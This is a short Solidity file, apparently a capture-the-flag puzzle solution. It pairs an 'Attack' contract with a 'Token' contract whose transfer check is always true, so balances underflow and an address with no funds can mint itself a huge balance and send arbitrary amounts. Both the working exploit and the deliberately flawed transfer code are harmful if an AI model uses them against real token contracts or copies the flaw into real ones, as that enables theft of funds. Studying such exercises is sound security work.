// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    Token public token;

    address public hackAdrr;
     mapping(address => uint256) balances;

    constructor (address _hackAdrr) public {
        token = Token(_hackAdrr);
    }

    function transferFunds(address _hackAdrr, uint256 _value) public  {
        token.transfer(_hackAdrr, _value);
        balances[_hackAdrr] += _value;
    }
}


contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}